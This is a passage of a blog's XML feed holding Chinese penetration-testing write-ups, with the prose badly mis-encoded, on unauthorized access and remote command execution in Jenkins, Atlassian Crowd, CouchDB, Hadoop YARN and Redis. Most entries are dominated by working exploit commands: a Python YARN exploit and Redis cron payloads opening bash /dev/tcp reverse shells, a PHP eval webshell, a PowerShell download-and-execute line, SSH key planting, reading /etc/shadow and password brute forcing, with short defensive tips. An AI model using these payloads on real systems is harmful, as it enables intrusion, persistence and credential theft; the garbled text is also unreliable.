Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID.a3c40b9a=node010r4vkf3cix27hr5qd9qvw5y41.node0; screenResolution=1920x1080 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 è¿›å…¥å®¹å™¨: docker-compose exec jenkins bash,çœ‹åˆ° /tmp/successæ–‡ä»¶åˆ›å»ºæˆåŠŸ é…ç½®æ–¹é¢çš„å®‰å…¨é—®é¢˜1.å…è®¸ä»»æ„è´¦æˆ·æ³¨å†Œ å¸¦æ¥çš„å®‰å…¨é—®é¢˜å…³é—­ç”¨æˆ·æ³¨å†Œ 2.å…è®¸åŒ¿åè®¿é—®å¸¦æ¥çš„é—®é¢˜å»ºè®®å…³é—­ jenkinsçš„æ—¥å¿—åŠŸèƒ½ä¸æ˜¯å¾ˆå¥½ï¼ˆå¯ä»¥ä½¿ç”¨ä»£ç†ï¼Œå¹¶è¿›è¡Œæ“ä½œçš„è®°å½•ï¼‰ å®‰å…¨å»ºè®® ä½¿ç”¨æœ€æ–°ç‰ˆçš„jenkins å…³é—­åŒ¿åè®¿é—® å…³é—­ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½ ç”¨æˆ·ä¸¥æ ¼æˆæƒ æœ€å°åŒ–æ’ä»¶ï¼Œç›¸å…³æ’ä»¶ä½¿ç”¨æœ€æ–°ç‰ˆ ä½¿ç”¨nginxä»£ç†jenkinsï¼Œä¸è¦ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ å‚è€ƒï¼šhttps://www.secpulse.com/archives/2166.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>Jenkins</tag>
        <tag> CVE-2017-1000353</tag>
        <tag>CVE-2018-1000861</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atlassian Crowdæœªæˆæƒè®¿é—®æ¼æ´]]></title>
    <url>%2Fposts%2F4469%2F</url>
    <content type="text"><![CDATA[æ¼æ´æ¦‚è¿°Atlassian Crowdå’ŒAtlassian Crowd Data Centeréƒ½æ˜¯æ¾³å¤§åˆ©äºšAtlassianå…¬å¸çš„äº§å“ã€‚Atlassian Crowdæ˜¯ä¸€å¥—åŸºäºWebçš„å•ç‚¹ç™»å½•ç³»ç»Ÿã€‚è¯¥ç³»ç»Ÿä¸ºç”¨ç”¨æˆ·ã€ç½‘ç»œåº”ç”¨ç¨‹åºå’Œç›®å½•æœåŠ¡å™¨æä¾›éªŒè¯ã€æˆæƒç­‰åŠŸèƒ½ã€‚Atlassian Crowd Data Centeræ˜¯Crowdçš„é›†ç¾¤éƒ¨ç½²ç‰ˆã€‚Atlassian Crowdå’ŒCrowd Data Centeråœ¨å…¶æŸäº›å‘è¡Œç‰ˆæœ¬ä¸­é”™è¯¯åœ°å¯ç”¨äº†äº†pdkinstallå¼€å‘æ’ä»¶,ä½¿å…¶å­˜åœ¨å®‰å…¨æ¼æ¼æ´æ´ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯åœ¨æœªæˆæƒè®¿é—®çš„æƒ…å†µä¸‹å¯¹Atlassian Crowdå’ŒCrowd Data Centerå®‰è£…ä»»æ„çš„æ¶æ„æ’ä»¶,æ‰§è¡Œä»»æ„ä»£ç /å‘½ä»¤,ä»è€Œè·å¾—æœåŠ¡å™¨æƒé™ ç¯å¢ƒæ­å»ºwget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip unzip atlassian-crowd-3.4.3.zip cd atlassian-crowd-3.4.3 vim crowd-webapp/WEB-INF/classes/crowd-init.properties #ä¿®æ”¹crowd-init.properties é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®ä¸»ç›®å½• crowd.home=/var/crowd-home # ä¸»ç›®å½•ä½ç½®(æ ¹æ®è‡ªå·±çš„å†™) # æ‰§è¡Œå¯åŠ¨å‘½ä»¤ ./start_crowd.sh æµè§ˆå™¨è®¿é—®http://192.168.0.100:8095 ç‚¹å‡»Set up Crowdè¿™é‡Œå»å®˜ç½‘ç”³è¯·è¯•ç”¨30å¤©https://my.atlassian.com/products/indexå¹¶å¡«å†™åˆ°license è¿›è¡Œä¸‹ä¸€æ­¥å®‰è£…,ç›´åˆ°å®‰è£…å®Œæˆã€‚ æœªæˆæƒè®¿é—®æµ‹è¯•å®‰è£…å®Œæˆä¹‹ååœ¨æ’ä»¶ç›®å½•ä¼šæœ‰ä¸€äº›æ’ä»¶bundled-pluginsä¸Šä¼ ä¸€ä¸ªæ ‡å‡†çš„æ’ä»¶,æ¥è‡ªatlassian-bundled-pluginsä¸­çš„applinks-plugin-5.4.12.jar curl --form "file_cdl=@applinks-plugin-5.4.12.jar" http://192.168.0.100:8095/crowd/admin/uploadplugin.action -v Atlassian Crowd RCEè¯¥æ¼æ´æºäºç½‘ç»œç³»ç»Ÿæˆ–äº§å“æœªå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæ­£ç¡®çš„éªŒè¯ã€‚å—å½±å“çš„äº§å“åŠç‰ˆæœ¬åŒ…æ‹¬ï¼šAtlassian Crowd 2.1.xç‰ˆæœ¬ï¼Œ3.0.5ä¹‹å‰çš„3.0.xç‰ˆæœ¬ï¼Œ3.1.6ä¹‹å‰çš„3.1.xç‰ˆæœ¬ï¼Œ3.2.8ä¹‹å‰çš„3.2.xç‰ˆæœ¬ï¼Œ3.3.5ä¹‹å‰çš„3.3.xç‰ˆæœ¬ï¼Œ3.4.4ä¹‹å‰çš„3.4.ç‰ˆæœ¬ï¼›Atlassian Crowd Data Center 2.1.xç‰ˆæœ¬ï¼Œ3.0.5ä¹‹å‰çš„3.0.xç‰ˆæœ¬ï¼Œ3.1.6ä¹‹å‰çš„3.1.xç‰ˆæœ¬ï¼Œ3.2.8ä¹‹å‰çš„3.2.xç‰ˆæœ¬ï¼Œ3.3.5ä¹‹å‰çš„3.3.xç‰ˆæœ¬ï¼Œ3.4.4ä¹‹å‰çš„3.4.ç‰ˆæœ¬ã€‚ æ¼æ´åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/jas502n/CVE-2019-11580 git clone https://github.com/jas502n/CVE-2019-11580 cd CVE-2019-11580/ python CVE-2019-11580.py http://192.168.0.100:8095 # é€šè¿‡æµè§ˆå™¨è®¿é—®é“¾æ¥æµ‹è¯•å…¶ä»–å‘½ä»¤ curl http://192.168.0.100:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow é˜²å¾¡æ‰‹æ®µ è®¾ç½®è®¿é—®/crowd/admin/uploadplugin.actionçš„æºip å‡çº§æœ€æ–°ç‰ˆæœ¬(3.5.0ä»¥ä¸Š)ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>Atlassian Crowd</tag>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CouchDBæœªæˆæƒè®¿é—®&å‘½ä»¤æ‰§è¡Œ]]></title>
    <url>%2Fposts%2F78%2F</url>
    <content type="text"><![CDATA[æ¼æ´ç®€ä»‹ä»¥åŠå±å®³Apache CouchDBæ˜¯ä¸€ä¸ªå¼€æºæ•°æ®åº“,ä¸“æ³¨äºæ˜“ç”¨æ€§å’Œæˆä¸ºâ€å®Œå…¨æ‹¥æŠ±webçš„æ•°æ®åº“â€ã€‚å®ƒæ˜¯ä¸€ä¸ªä½¿ç”¨JSONä½œä¸ºå­˜å‚¨æ ¼å¼,JavaScriptä½œä¸ºæŸ¥è¯¢è¯­è¨€,MapReduceå’ŒHTTPä½œä¸ºAPIçš„NoSQLæ•°æ®åº“ã€‚åº”ç”¨å¹¿å¹¿æ³›,å¦‚BBCç”¨åœ¨å…¶åŠ¨æ€å†…å®¹å±•ç¤ºå¹³å°,Credit Suisseç”¨åœ¨å…¶å†…éƒ¨çš„å•†å“éƒ¨â»”çš„å¸‚åœºæ¡†æ¶,Meebo,ç”¨åœ¨å…¶ç¤¾äº¤å¹³å°(webå’Œåº”ç”¨ç¨‹åº),é»˜è®¤ä¼šåœ¨5984ç«¯å£å¼€æ”¾Restfulçš„APIæ¥å£å£,å¦‚æœä½¿ç”¨SSLçš„è¯å°±ä¼šç›‘å¬åœ¨6984ç«¯å£,ç”¨äºæ•°æ®åº“çš„ç®¡ç†åŠŸèƒ½ã€‚å…¶HTTP Serveré»˜è®¤å¼€å¯æ—¶æ²¡æœ‰è¿›è¡Œè¡Œè¡ŒéªŒè¯,è€Œä¸”ç»‘å®šåœ¨0.0.0.0,æ‰€æœ‰ç”¨æˆ·å‡å¯é€šè¿‡APIè®¿é—®å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚åœ¨å®˜æ–¹æ–¹é…ç½®æ–‡æ–‡æ¡£ä¸­å¯¹HTTP Serverçš„é…ç½®æœ‰WWW-Authenticate:Set this option to triggerbasic-auth popup on unauthorized requests,ä½†æ˜¯å¾ˆå¤šç”¨æˆ·éƒ½æ²¡æœ‰è¿™ä¹ˆé…ç½®,å¯¼è‡´æ¼æ´äº§ç”Ÿã€‚ åœ¨2017å¹´11æœˆ15æ—¥ï¼ŒCVE-2017-12635å’ŒCVE-2017-12636æŠ«éœ²ï¼ŒCVE-2017-12636æ˜¯ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡config apiä¿®æ”¹couchdbçš„é…ç½®query_serverï¼Œè¿™ä¸ªé…ç½®é¡¹åœ¨è®¾è®¡ã€æ‰§è¡Œviewçš„æ—¶å€™å°†è¢«è¿è¡Œã€‚ å½±å“ç‰ˆæœ¬ï¼šå°äº 1.7.0 ä»¥åŠ å°äº 2.1.1 æ¼æ´ç¯å¢ƒvulnhub æ¼æ´åˆ©ç”¨CVE-2017-12636æ˜¯éœ€è¦ç™»å½•ç”¨æˆ·æ–¹å¯è§¦å‘ï¼Œå¦‚æœä¸çŸ¥é“ç›®æ ‡ç®¡ç†å‘˜å¯†ç ï¼Œå¯ä»¥åˆ©CVE-2017-12635CVE-017-12635å…ˆã€å¢åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ã€‘ï¼Œå¦‚æœæ— é¡»å¸å·å¯†ç ï¼Œå°±å¯é€šè¿‡æœªæˆæƒè®¿é—®è¿›è¡Œå‘½ä»¤æ‰§è¡ŒåŒæ ·ï¼Œè®°å¾—åœ¨Burpçš„æ‹¦æˆªç«¯å£æ·»åŠ ä¸€ä¸ª5984 è¿›å…¥ç¯å¢ƒï¼Œå¹¶å¯åŠ¨ cd couchdb/CVE-2017-12636/ docker-compose up -d æœªæˆæƒè®¿é—®æµ‹è¯•curl http://192.168.0.100:5984 curl http://192.168.0.100:5984/_config ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´# æœ¬æœºpythonè¿è¡ŒhttpæœåŠ¡(å¯ä»¥ä¸è¿è¡Œè¿™ä¸ªæ­¥éª¤ï¼Œè¿™é‡Œåªæ˜¯åšcurlæµ‹è¯•ç”¨çš„) python -m SimpleHTTPServer 8888 1.6.0 ä¸‹ #ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '"curl http://192.168.0.105:8888/test.php"' # è¿™é‡Œå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ #curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '" cat /etc/passwd >> tmp/ext_passwd"' curl -X PUT 'http://192.168.0.100:5984/vultest' # æ·»åŠ ä¸€ä¸ªDatabaseå’ŒDocument curl -X PUT 'http://192.168.0.100:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}' curl -X POST 'http://192.168.0.100:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json' # åœ¨è¿™ä¸ªDatabaseé‡ŒæŸ¥è¯¢ï¼Œå°†languageè®¾ç½®ä¸ºcmdï¼Œè¿™é‡Œå°±ä¼šç”¨åˆ°æˆ‘ç¬¬ä¸€æ­¥é‡Œæ·»åŠ çš„åä¸ºcmdçš„query_serversï¼Œæœ€åè§¦å‘å‘½ä»¤æ‰§è¡Œ 2.1.0 ä¸‹ # 2.1.0ä¸­ä¿®æ”¹äº†1.6.0ç”¨åˆ°çš„ä¸¤ä¸ªAPI # Couchdb 2.x å¼•å…¥äº†é›†ç¾¤ï¼Œæ‰€ä»¥ä¿®æ”¹é…ç½®çš„APIéœ€è¦å¢åŠ node nameã€‚æˆ‘ä»¬å¸¦ä¸Šè´¦å·å¯†ç è®¿é—®/_membershipå³å¯ curl http://&lt;your-ip>:5984/_membership # åˆ©ç”¨(è·Ÿ1.6.0ç±»ä¼¼) curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/CVE-2017-12636_is_success"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' #å…ˆå¢åŠ ä¸€ä¸ªDatabaseå’Œä¸€ä¸ªDocument curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}' #Couchdb 2.xåˆ é™¤äº†_temp_viewï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ºäº†è§¦å‘query_serversä¸­å®šä¹‰çš„å‘½ä»¤ï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ª_view curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json" #å¢åŠ _viewçš„åŒæ—¶å³è§¦å‘äº†query_serversä¸­çš„å‘½ä»¤ã€‚ expåœ°å€ https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py nmapæ‰«æ nmap -p 5984 --script "couchdb-stats.nse" &lt;target_ip> é˜²å¾¡æ‰‹æ®µ ç»‘å®šæŒ‡å®šip è®¾ç½®è®¿é—®å¯† document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>CouchDB</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>CVE-2017-12635</tag>
        <tag>CVE-2017-12636</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoopæœªæˆæƒè®¿é—®æ¼æ´]]></title>
    <url>%2Fposts%2F59457%2F</url>
    <content type="text"><![CDATA[æ¼æ´ç®€ä»‹ä»¥åŠå±å®³Hadoopæ˜¯ä¸€ä¸ªç”±ApacheåŸºé‡‘ä¼šæ‰€å¼€å‘çš„åˆ†å¸ƒå¼ç³»ç»ŸåŸºç¡€æ¶æ„,ç”±äºæœåŠ¡å™¨å™¨ç›´æ¥åœ¨å¼€æ”¾äº†äº†Hadoop æœºå™¨å™¨ HDFS çš„ 50070 web ç«¯å£åŠéƒ¨åˆ†é»˜è®¤æœåŠ¡å£å£,é»‘å®¢å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ“ä½œå¤šä¸ªç›®å½•ä¸‹çš„æ•°æ®,å¦‚è¿›è¡Œåˆ é™¤,ä¸‹è½½,ç›®å½•æµè§ˆç”šè‡³å‘½ä»¤è¡Œè¡Œç­‰æ“ä½œ,äº§ç”Ÿæå¤§çš„å±å®³ã€‚ ç¯å¢ƒvulnhub æµ‹è¯•å¯åŠ¨ç¯å¢ƒ docker-compose up -d è®¿é—® http://192.168.0.100:8088/cluster é€šè¿‡REST APIå‘½ä»¤æ‰§è¡Œåˆ©ç”¨è¿‡ç¨‹ï¼šåœ¨æœ¬åœ°ç›‘å¬ç«¯å£ &gt; åˆ›å»ºApplication &gt; è°ƒç”¨Submit Application APIæäº¤1.æœ¬æœºç›‘å¬ nc -lvvp 8888 2.ç›´æ¥æœ¬æœºæ‰§è¡ŒEXPï¼špython exp.py import requests target = 'http://192.168.0.100:8088/' lhost = '192.168.0.105' # put your local host ip here, and listen at port 8888 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell','am-container-spec': { 'commands': { 'command': '/bin/bash -i >&amp; /dev/tcp/%s/8888 0>&amp;1' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 3.åå¼¹shellæˆåŠŸ é˜²å¾¡æ‰‹æ®µ å¦‚æ— å¿…è¦, å…³é—­ Hadoop Web ç®¡ç†â»šé¢ã€‚ å¼€å¯èº«ä»½éªŒè¯ ,é˜²æ­¢æœªç»æˆæƒç”¨æˆ·è®¿é—®ã€‚ è®¾ç½®â€œå®‰å…¨ç»„â€è®¿é—®æ§åˆ¶ç­–ç•¥,å°† Hadoop é»˜è®¤å¼€æ”¾çš„å¤šä¸ªç«¯å£å¯¹å…¬ç½‘å…¨éƒ¨ç¦æ­¢æˆ–é™åˆ¶å¯ä¿¡ä»»çš„ IP åœ°å€æ‰èƒ½è®¿åŒ…æ‹¬ 50070 ä»¥åŠ WebUI ç­‰ç›¸å…³ç«¯å£ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisæ¼æ´åˆ©ç”¨]]></title>
    <url>%2Fposts%2F6%2F</url>
    <content type="text"><![CDATA[å‡†å¤‡1.ä¸‹è½½ç¼–è¯‘ wget http://download.redis.io/releases/redis-6.0.3.tar.gz tar xzf redis-6.0.3.tar.gz cd redis-6.0.3 make 2.æ‹·è´äºŒè¿›åˆ¶æ–‡ä»¶ cd src/ cp redis-server /usr/bin cp redis-cli /usr/bin cd .. cp redis.conf /etc/ 3.ä¿®æ”¹redis.conf, å¼€å¯å¤–éƒ¨è®¿é—®ï¼Œå…³é—­ä¿æŠ¤æ¨¡å¼(ä¿æŠ¤æ¨¡å¼ä¸‹è¿è¡Œredisæ˜¯åˆ©ç”¨ä¸æˆåŠŸæ»´) 4.å¯åŠ¨redisæœåŠ¡ redis-server /etc/redis.conf # æˆ–è€…ç›´æ¥ä»¥éä¿æŠ¤æ¨¡å¼è¿è¡Œä¹Ÿå¯ä»¥ ./redis_server --protected-mode no 5.è¿æ¥redisçš„æ–¹å¼ # nc nc 1.1.1.1.10 6379 -vv # telent #æˆ–redis-cliè¿æ¥ redis-cli -h 192.168.0.100 å¸¸ç”¨å‘½ä»¤ # æŸ¥çœ‹é‡Œé¢çš„keyå’Œå…¶å¯¹åº”çš„å€¼ keys * get key # è·å–å¤‡ä»½è·¯å¾„ config get dir # è·å–å¤‡ä»½æ–‡ä»¶å config get dbfilename save # ä¿å­˜æ•°æ®åˆ°å¤‡ä»½è·¯å¾„(dir+dbfilename) # è®¾ç½®å¤‡ä»½è·¯å¾„ config set dir /root/ # å¯ä»¥ç§»åŠ¨åˆ°rootï¼Œç„¶åè®¿é—®ï¼ˆå¦‚æœèƒ½è®¿é—®ï¼Œå°±æ˜¯rootæƒé™ -->å¯ç”¨æ¥åˆ¤æ–­æƒé™ï¼‰ # è®¾ç½®å¤‡ä»½æ–‡ä»¶å config set dbfilename filename # è®¾ç½®é”®å€¼å¯¹ set keyname value # è·å–é”®å€¼å¯¹ get keyname # æŒä¹…åŒ–(ä¿å­˜åˆ°ç£ç›˜) save æµ‹è¯•ä¸€ã€å†™æ–‡ä»¶(åˆ©ç”¨æœªæˆæƒè®¿é—®)æµ‹è¯•ç¯å¢ƒï¼šcentos 1.crontabè®¡åˆ’ä»»åŠ¡åå¼¹shell rootæƒé™è¿è¡Œredis 1.æœ¬æœºç›‘å¬ç«¯å£ nc -lvvp 4444 2.åˆ©ç”¨redisç”Ÿæˆè®¡åˆ’ä»»åŠ¡é…ç½®æ–‡ä»¶ set -.- "\n\n\n* * * * * bash -i >&amp; /dev/tcp/192.168.0.106/5555 0>&amp;1\n\n\n" config set dir /var/spool/cron/ config set dbfilename root save 3.æœ¬æœºè·å¾—åå¼¹shell Note:å½“ç›®æ ‡ä¸»æœºä¸ºcentosæ—¶å¯ä»¥åå¼¹shell, è€Œubuntuå’Œdebianå‡æ— æ³•æˆåŠŸåå¼¹shellã€‚åŸå› ï¼šç”±äºrediså‘ä»»åŠ¡è®¡åˆ’æ–‡ä»¶é‡Œå†™å†…å®¹å‡ºç°ä¹±ç è€Œå¯¼è‡´çš„è¯­æ³•é”™è¯¯ï¼Œè€Œä¹±ç æ˜¯é¿å…ä¸äº†çš„ï¼Œcentosä¼šå¿½ç•¥ä¹±ç å»æ‰§è¡Œæ ¼å¼æ­£ç¡®çš„ä»»åŠ¡è®¡åˆ’ã€‚ 2.ç›´æ¥å†™å…¥å…¬é’¥ rootæƒé™è¿è¡Œredisï¼Œ ä¸”ç›®æ ‡ä¸»æœºå¼€å¯äº†sshå¯†é’¥ç™»å½• # æœ¬æœºå…ˆç”Ÿæˆå¯†é’¥ ssh-keygen -t rsa # å…¬é’¥å†…å®¹å¯¼å…¥key.txtæ–‡ä»¶ (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt # config set dir /root/.ssh/ config set dbfilename authorized_keys set test6 "\n\n\nssh key\n\n\n ssh-rsa xxxxxxxxxxxxx" (å…¬é’¥çš„å€¼) save # ç„¶åæœ¬æœºç›´æ¥è¿æ¥ç›®æ ‡ ssh -o StrictHostKeyChecking=no 192.168.0.100 åŒæ—¶ä¹Ÿè¦æ³¨æ„ç³»ç»Ÿçš„ä¹±ç é—®é¢˜ 3.ä½æƒé™å†™å…¥WebShell éœ€è¦çŸ¥é“ç½‘ç«™è·¯å¾„ config set dir /var/www/html/ # éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ config set dbfilename 1.php set 1 "&lt;?php eval($_POST[1]); ?>" save # è®¿é—®webshell 4.å¼€æœºè‡ªå¯ç›®å½• å‰æï¼šrediséƒ¨ç½²åœ¨windowsä¸»æœºä¸Š # å†™å…¥æ‰¹å¤„ç†æ–‡ä»¶åˆ°Administratorç”¨æˆ·çš„å¼€æœºå¯åŠ¨ç›®å½• # ä½¿ç”¨powershellè¿œç¨‹ä¸‹è½½æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åº config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/" config set dbfilename add.bat set xx "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX((New-ObjectNet.WebClient).DownloadString('http://xxx.xx.xxxx/add'))\"\r\n\r\n" save æ‹“å±•æ”»å‡»æ–¹æ³• ä¿¡æ¯æ³„æ¼(å¾ˆå¤šredisæ²¡è®¾ç½®å¯†ç ï¼Œå¯»æ‰¾æ•æ„Ÿä¿¡æ¯) é…åˆssrf æœ¬åœ°luaä»£ç  æœ¬åœ°ææƒ ç­‰ç­‰ 5.å†™å…¥æŒ–çŸ¿è¿›ç¨‹nmapæ£€æµ‹nmap -p 6379 --script redis-info 192.168.0.100 #åœ°å€:https://svn.nmap.org/nmap/scripts/redis-info.nse å®‰å…¨æ£€æŸ¥#1.æŸ¥çœ‹redisè¿è¡Œçš„ç”¨æˆ·æƒé™ ps -aux |grep redis #2.æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·sshéªŒè¯æ–‡ä»¶æ˜¯å¦å¼‚å¸¸ /user/.ssh/authorized_keys #3.æŸ¥çœ‹crontab /var/spoof/cron/ #4.æŸ¥çœ‹crontabçš„æ—¥å¿— tail /var/log/cron äºŒã€Redis-RCEåˆ©ç”¨ç”¨å‰ææ˜¯è·å–redisè®¿é—®æƒé™,ä¹Ÿå°±æ˜¯åŸºäºredisæœªæˆæƒè®¿é—® 1.redisä¸»ä»åŒæ­¥rce ä½¿ç”¨èŒƒå›´redis 4.x-5.0.5 åœ¨Redis 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ git clone https://github.com/Ridter/redis-rce.git git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git # ç¼–è¯‘soæ–‡ä»¶ cd RedisModules-ExecuteCommand/ make # è¿è¡Œsss python redis-rce.py -r &lt;ç›®æ ‡åœ°å€> -L &lt;æœ¬æœºåœ°å€> -f module.so # æ‰§è¡ŒæˆåŠŸåå¯ä»¥é€‰æ‹©ç”Ÿæˆä¸€ä¸ªäº¤äº’çš„shellï¼Œæˆ–è€…é‡æ–°åå¼¹ä¸€ä¸ªshell 2.ååºåˆ—åŒ–rceå½“é‡åˆ° redis æœåŠ¡å™¨å†™æ–‡ä»¶æ— æ³• getshellï¼Œå¯ä»¥æŸ¥çœ‹redisæ•°æ®æ˜¯å¦ç¬¦åˆåºåˆ—åŒ–æ•°æ®çš„ç‰¹å¾ã€‚ jacksonï¼šå…³æ³¨ json å¯¹è±¡æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ çœ‹èµ·æ¥åƒä¸åƒç±»åï¼Œä¾‹å¦‚["com.blue.bean.User",xxx] fastjsonï¼šå…³æ³¨æœ‰æ²¡æœ‰ @type å­—æ®µ jdkï¼šé¦–å…ˆçœ‹ value æ˜¯ä¸æ˜¯ base64ï¼Œå¦‚æœæ˜¯è§£ç åçœ‹é‡Œé¢æœ‰æ²¡æœ‰ java åŒ…å https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q 3.lua rce é€‚ç”¨äºé«˜æƒé™è¿è¡Œä½ç‰ˆæœ¬redisçš„luaè™šæ‹Ÿæœºï¼Œå†™æ–‡ä»¶å¤±è´¥æ—¶è¿›è¡Œå°è¯• ä½¿ç”¨info server å’Œ eval â€œreturn _VERSIONâ€ 0å‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰redisç‰ˆæœ¬å’Œç¼–è¯‘ä¿¡æ¯ã€‚ exp https://github.com/QAX-A-Team/redis_lua_exploit/ ä¿®æ”¹redis_lua.pyä¸­ç›®æ ‡åœ°å€ä¸ºé¶æœºçš„åœ°å€å’Œç«¯å£ è¿è¡Œexp æ‰§è¡ŒæˆåŠŸåå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼Œè¿™é‡Œåå¼¹shell eval "tonumber('/bin/bash -i >&amp; /dev/tcp/192.168.0.105/5555 0>&amp;1', 8)" 0 ä¸‰ã€rediså¯†ç çˆ†ç ´1.ä½¿ç”¨redis-cliè¿æ¥ï¼Œä½¿ç”¨-aå‚æ•°æŒ‡å®šå¯†ç æ“ä½œã€‚ redir-cli -h 192.168.0.100 -a admin123 # è¿™ä¸ªå¥½åƒæ²¡è¿™ä¹ˆå®ç”¨æ„Ÿè§‰ï¼Œä¹Ÿè®¸å¯ä»¥å†™æˆè„šæœ¬æ‰¹é‡è·‘ 2.msfçš„auxiliary/scanner/redis/redis_loginæ¨¡å— use auxiliary/scanner/redis/redis_login set rhost ... set threads ... set pass_file xxxxxxx.txt run 3.hydra # è¿˜æ˜¯hydraå¥½ç”¨ï¼Œé€Ÿåº¦è¿˜å¿« hydra -P redis_pass.txt redis://192.168.0.100 é˜²å¾¡æ‰‹æ®µ ç¦æ­¢rootè¿è¡Œredis è®¾ç½®è´¦æˆ·å¯†ç è®¤è¯ æœåŠ¡éƒ¨ç½²ä½¿ç”¨å•ç‹¬ä½æƒé™è´¦æˆ· æ·»åŠ IPè®¿é—®é™åˆ¶(bind),å¹¶æ›´æ›´æ”¹é»˜è®¤6379ç«¯å£ 